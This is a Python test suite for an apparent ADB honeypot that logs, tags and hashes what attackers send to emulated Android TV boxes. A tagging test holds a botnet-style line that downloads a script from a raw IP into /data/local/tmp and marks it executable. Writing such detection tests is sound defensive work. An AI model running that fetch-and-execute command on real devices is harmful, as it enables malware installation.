import asyncio
import hashlib
import json
import struct
import tempfile
import unittest
from pathlib import Path

from botpolice.config import AdbConfig, Limits
from botpolice.eventlog import verify_log
from botpolice.services.adb import (
    ADB_MAXDATA,
    ADB_VERSION,
    AdbData,
    AdbProtocolError,
    build_message,
    parse_header,
    start_adb,
    tag_shell_command,
)
from botpolice.services.common import ConnectionLimiter, ServiceContext

from helpers import MatchRecorder, make_sink, read_all, server_port


def _bad_magic_header(command: bytes = b"CNXN", data_length: int = 0) -> bytes:
    return struct.pack("<4sIIIII", command, 0, 0, data_length, 0, 0x12345678)


class ParseHeaderTests(unittest.TestCase):
    def test_valid_roundtrip(self) -> None:
        raw = build_message(b"WRTE", 7, 9, b"hello")
        header = parse_header(raw)
        self.assertEqual(header.name, "WRTE")
        self.assertEqual(header.arg0, 7)
        self.assertEqual(header.arg1, 9)
        self.assertEqual(header.data_length, 5)
        self.assertEqual(header.data_checksum, sum(b"hello"))

    def test_bad_magic_rejected(self) -> None:
        with self.assertRaises(AdbProtocolError):
            parse_header(_bad_magic_header())

    def test_unknown_command_rejected(self) -> None:
        raw = build_message(b"CNXN")
        raw = b"XXXX" + raw[4:]
        with self.assertRaises(AdbProtocolError):
            parse_header(raw)

    def test_short_header_rejected(self) -> None:
        with self.assertRaises(AdbProtocolError):
            parse_header(b"\x00" * 10)

    def test_oversized_payload_rejected(self) -> None:
        raw = struct.pack(
            "<4sIIIII", b"WRTE", 0, 0, 10_000_000, 0, int.from_bytes(b"WRTE", "little") ^ 0xFFFFFFFF
        )
        with self.assertRaises(AdbProtocolError):
            parse_header(raw)
        with self.assertRaises(AdbProtocolError):
            parse_header(raw, max_data_length=4096)

    def test_build_message_requires_four_byte_command(self) -> None:
        with self.assertRaises(ValueError):
            build_message(b"AB")


class TagTests(unittest.TestCase):
    def test_tags_cover_botnet_indicators(self) -> None:
        tags = tag_shell_command("cd /data/local/tmp && wget http://1.2.3.4/x.sh && chmod +x x.sh")
        self.assertIn("download", tags)
        self.assertIn("chmod", tags)
        self.assertIn("tmp_exec", tags)

    def test_model_strings_tagged(self) -> None:
        self.assertIn("ai_model", tag_shell_command("ls /srv/models/llama.gguf"))
        self.assertIn("pm_install", tag_shell_command("pm install /data/local/tmp/a.apk"))

    def test_unknown_command_has_no_tags(self) -> None:
        self.assertEqual(tag_shell_command("id"), [])


class AdbDataTests(unittest.TestCase):
    def test_lookup_exact_and_first_token(self) -> None:
        data = AdbData.default()
        self.assertEqual(data.lookup("id"), data.responses["id"])
        self.assertEqual(data.lookup("uname -a"), data.responses["uname -a"])
        self.assertEqual(data.lookup("whoami -x"), data.responses["whoami"])
        self.assertIsNone(data.lookup("totally-unknown-cmd"))

    def test_load_missing_file_falls_back(self) -> None:
        data = AdbData.load(Path("does-not-exist-xyz.json"))
        self.assertEqual(data.responses["id"], AdbData.default().responses["id"])
        self.assertEqual(data.identity["ro.product.name"], "tvbox")

    def test_load_custom_file(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "r.json"
            path.write_text(
                json.dumps(
                    {
                        "identity": {"ro.product.name": "custombox"},
                        "responses": {"id": "custom"},
                    }
                ),
                encoding="utf-8",
            )
            data = AdbData.load(path)
            self.assertEqual(data.lookup("id"), "custom")
            self.assertEqual(data.identity["ro.product.name"], "custombox")
            self.assertIn(b"custombox", data.banner())

    def test_load_flat_responses_map(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            path = Path(tmp) / "r.json"
            path.write_text(json.dumps({"id": "flat"}), encoding="utf-8")
            data = AdbData.load(path)
            self.assertEqual(data.lookup("id"), "flat")


class AdbServiceTestCase(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.sink, self.log = make_sink(self.root)
        self.ctx = ServiceContext(
            sink=self.sink,
            limits=Limits(),
            limiter=ConnectionLimiter(16),
            matcher=MatchRecorder(),
            http_url="http://127.0.0.1:8080",
        )
        self.servers = []
        self.addAsyncCleanup(self._stop)

    async def _stop(self) -> None:
        for server in self.servers:
            server.close()
        for server in self.servers:
            await server.wait_closed()

    async def _start(self, **kwargs) -> int:
        config = AdbConfig(**kwargs)
        server = await start_adb(self.ctx, "127.0.0.1", 0, config=config, data=AdbData.default())
        self.servers.append(server)
        return server_port(server)

    async def _read_message(self, reader, timeout: float = 5.0):
        header_bytes = await asyncio.wait_for(reader.readexactly(24), timeout=timeout)
        header = parse_header(header_bytes)
        data = b""
        if header.data_length:
            data = await asyncio.wait_for(
                reader.readexactly(header.data_length), timeout=timeout
            )
        return header, data

    async def _collect_until_clse(self, reader, timeout: float = 5.0):
        messages = []
        while True:
            header, data = await self._read_message(reader, timeout)
            messages.append((header, data))
            if header.name == "CLSE":
                return messages

    def _events(self, event: str):
        return [e for e in self.log.read_all() if e["event"] == event]

    async def test_handshake_and_auth_accepted(self) -> None:
        port = await self._start()
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(build_message(b"CNXN", ADB_VERSION, ADB_MAXDATA, b"host::\0"))
        await writer.drain()
        header, data = await self._read_message(reader)
        self.assertEqual(header.name, "CNXN")
        self.assertIn(b"tvbox::", data)

        writer.write(build_message(b"AUTH", 2, 0, b"token"))
        await writer.drain()
        header, _ = await self._read_message(reader)
        self.assertEqual(header.name, "OKAY")
        writer.close()

        self.assertEqual(len(self._events("adb_handshake")), 2)
        self.assertEqual(self._events("adb_connection")[0]["severity"], "medium")

    async def test_shell_command_logged_and_answered(self) -> None:
        port = await self._start()
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(build_message(b"OPEN", 1, 0, b"shell:uname -a\0"))
        await writer.drain()
        messages = await self._collect_until_clse(reader)
        writer.close()

        self.assertEqual(messages[0][0].name, "OKAY")
        output = b"".join(d for h, d in messages if h.name == "WRTE")
        self.assertIn(b"Linux", output)

        entry = self._events("adb_shell_command")[-1]
        self.assertEqual(entry["severity"], "high")
        self.assertEqual(entry["extra"]["command"], "uname -a")

    async def test_unknown_shell_command_fallback(self) -> None:
        port = await self._start()
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(build_message(b"OPEN", 1, 0, b"shell:frobnicate\0"))
        await writer.drain()
        messages = await self._collect_until_clse(reader)
        writer.close()
        output = b"".join(d for h, d in messages if h.name == "WRTE")
        self.assertIn(b"not found", output)

    async def test_refused_service_logged(self) -> None:
        port = await self._start()
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(build_message(b"OPEN", 1, 0, b"tcp:5555\0"))
        await writer.drain()
        messages = await self._collect_until_clse(reader)
        writer.close()
        self.assertEqual(messages[-1][0].name, "CLSE")
        entry = self._events("adb_open_refused")[-1]
        self.assertEqual(entry["extra"]["service"], "tcp")

    async def test_sync_file_push_hashed_and_discarded(self) -> None:
        port = await self._start()
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        content = b"#!/bin/sh\necho pwned\n"

        writer.write(build_message(b"OPEN", 1, 0, b"sync:\0"))
        await writer.drain()
        header, _ = await self._read_message(reader)
        self.assertEqual(header.name, "OKAY")
        device_id = header.arg0

        async def wrte(body: bytes) -> None:
            writer.write(build_message(b"WRTE", 1, device_id, body))
            await writer.drain()

        name = b"evil.sh"
        consumed = 12 + len(name) + 1
        pad = (-consumed) % 4
        await wrte(b"SEND" + struct.pack("<I", 0o755) + struct.pack("<I", len(content)) + name + b"\0" + b"\0" * pad)
        await wrte(b"DATA" + struct.pack("<I", len(content)) + content)
        await wrte(b"DONE" + struct.pack("<I", 0))

        await asyncio.sleep(0.2)
        writer.close()

        entries = self._events("adb_file_push")
        self.assertTrue(entries)
        entry = entries[-1]
        self.assertEqual(entry["severity"], "high")
        self.assertEqual(entry["extra"]["filename"], "evil.sh")
        self.assertEqual(entry["extra"]["received_size"], len(content))
        self.assertEqual(entry["extra"]["sha256"], hashlib.sha256(content).hexdigest())
        self.assertFalse(entry["extra"]["stored"])

        written = {p.name for p in self.root.iterdir()}
        self.assertEqual(written, {"events.jsonl"})

    async def test_file_pull_round_trip_logged(self) -> None:
        port = await self._start()
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(build_message(b"OPEN", 1, 0, b"sync:\0"))
        await writer.drain()
        header, _ = await self._read_message(reader)
        device_id = header.arg0

        path = b"/data/local/tmp/x"
        consumed = 4 + len(path) + 1
        pad = (-consumed) % 4
        writer.write(
            build_message(
                b"WRTE",
                1,
                device_id,
                b"RECV" + path + b"\0" + b"\0" * pad,
            )
        )
        await writer.drain()
        await asyncio.sleep(0.2)
        writer.close()

        entry = self._events("adb_file_pull")[-1]
        self.assertEqual(entry["severity"], "high")
        self.assertEqual(entry["extra"]["filename"], "/data/local/tmp/x")

    async def test_malformed_then_recovers_and_chain_verifies(self) -> None:
        port = await self._start()
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(_bad_magic_header())
        await writer.drain()
        await read_all(reader)
        writer.close()

        self.assertTrue(self._events("adb_malformed"))
        self.assertTrue(verify_log(self.log.path).ok)

        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(build_message(b"AUTH", 2, 0, b"token"))
        await writer.drain()
        header, _ = await self._read_message(reader)
        self.assertEqual(header.name, "OKAY")
        writer.close()
        self.assertTrue(verify_log(self.log.path).ok)

    async def test_command_cap_enforced(self) -> None:
        port = await self._start(max_commands_per_session=2)
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        for i in range(3):
            writer.write(build_message(b"OPEN", i + 1, 0, b"shell:id\0"))
            await writer.drain()
            await asyncio.sleep(0.05)
        await asyncio.sleep(0.2)
        writer.close()

        limits = self._events("adb_session_limit")
        self.assertTrue(limits)
        self.assertEqual(limits[-1]["severity"], "high")

    async def test_idle_timeout_closes_connection(self) -> None:
        port = await self._start(idle_timeout_seconds=0.2)
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        writer.write(build_message(b"CNXN", ADB_VERSION, ADB_MAXDATA, b"host::\0"))
        await writer.drain()
        await self._read_message(reader)
        data = await read_all(reader, timeout=2.0)
        self.assertEqual(data, b"")
        writer.close()

    async def test_flood_of_opens_is_bounded(self) -> None:
        port = await self._start(max_commands_per_session=5)
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        for i in range(50):
            writer.write(build_message(b"OPEN", i + 1, 0, b"shell:id\0"))
        await writer.drain()
        await read_all(reader, timeout=2.0)
        writer.close()
        self.assertTrue(verify_log(self.log.path).ok)


if __name__ == "__main__":
    unittest.main()
